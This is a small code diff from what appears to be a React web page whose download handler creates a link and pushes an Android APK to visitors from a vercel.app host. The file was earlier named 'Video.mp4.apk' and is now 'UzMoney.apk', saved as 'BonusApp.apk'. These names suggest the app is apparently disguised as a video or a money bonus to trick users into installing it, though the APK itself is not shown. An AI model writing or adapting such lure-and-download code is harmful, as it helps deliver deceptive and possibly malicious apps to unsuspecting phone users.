@@ -4,7 +4,7 @@ export default function App() {
   const handleDownload = (e) => {
     e.preventDefault();
     const link = document.createElement('a');
-    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
+    link.href = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
     link.download = 'BonusApp.apk';
     document.body.appendChild(link);
     link.click();
